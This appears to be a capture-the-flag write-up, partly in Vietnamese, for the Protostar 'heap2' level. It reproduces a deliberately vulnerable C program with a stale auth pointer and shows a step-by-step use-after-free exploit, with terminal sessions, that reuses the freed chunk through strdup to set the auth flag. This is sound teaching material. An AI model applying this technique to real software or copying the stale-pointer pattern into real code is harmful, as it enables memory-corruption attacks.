# HEAP TWO

## About

This level examines what can happen when heap pointers are stale.

This level is completed when you see the “you have logged in already!” message

This level is at /opt/protostar/bin/heap2

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

## Solutions

`HEAP TWO` là một cấp độ đơn giản giới thiệu những gì xảy ra với con trỏ dữ liệu của người dùng sau khi `chunk heap` được cấp phát bị `free()`. Đó thực sự là một ví dụ điển hình về `Use After Free [UAF]`. Mục tiêu của chúng ta ở đây là để chương trình in `"you have logged in already!"`.

Chương trình có một vài chức năng như `auth`, `reset`, `service` và `login`. Chúng ta sẽ thử chạy chương trình.

```
root@protostar:/opt/protostar/bin# ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
login
please enter your password
[ auth = 0x804c008, service = (nil) ]
service AAAA
[ auth = 0x804c008, service = 0x804c008 ]
login
please enter your password
[ auth = 0x804c008, service = 0x804c008 ]
```

Chúng tôi nhận thấy rằng con trỏ `auth` vẫn trỏ đến vị trí bộ nhớ ban đầu sau lệnh `reset` - gọi tới hàm `free()` giải phóng bộ nhớ được cấp phát động bằng con trỏ `auth`. Hơn nữa chức năng `login` vẫn tham chiếu tới `auth->auth` tại vị trí đó sau khi đã được giải phóng. Bây giờ mục tiếu của chúng ta là ghi đè giá trị của `auth->auth` bằng 1.

Chúng ta sẽ nói qua về `strdup()`, nó nhân bản chuỗi được truyền cho nó vào con trỏ được gán và vùng nhớ đó là trên Heap memory. Bạn có thể xem qua đoạn code C mô tả sau - tôi lấy nó trên `stackoverflow`.

```
char *strdup(const char *src) {
    char *dst = malloc(strlen (src) + 1);  // Space for length plus nul
    if (dst == NULL) return NULL;          // No memory
    strcpy(dst, src);                      // Copy the characters
    return dst;                            // Return the new string
}
```

Và trong những lần chạy thử sau khi `reset` rồi gọi đến `service` địa chỉ của `service` nằm trên phần cấp phát động của `auth`.

```
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service AAAA
[ auth = 0x804c008, service = 0x804c018 ]
```

```
                 0x804c018
[auth->name].....[service]......[auth->auth]
  |                             |          
  |_____________________________|
0x804c008       32             
```

Vì vậy, cách khai thác của chúng tôi là cấp phát một `struct auth` và giải phóng nó bằng lệnh `reset`. Tiếp theo, chúng tôi sử dụng lệnh `service` gọi hàm `strdup()` cấp phát bộ nhớ trên heap và ghi một chuỗi 16 ký tự `"1"` vì `strdup()` phân bổ bộ nhớ tại cùng một vị trí với `struct auth` được giải phóng. Mức này đủ đơn giản để chúng ta không cần phải quá chính xác về những gì hoặc bao nhiêu byte mà chúng ta viết `strdup()`.

Tiến hành khai thác.

```
root@protostar:/opt/protostar/bin# ./heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service 111111111111111111111111111111111
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

## Documents

<https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf>

<https://sourceware.org/glibc/wiki/MallocInternals>

<https://encyclopedia.kaspersky.com/glossary/use-after-free/>

<https://cwe.mitre.org/data/definitions/416.html>



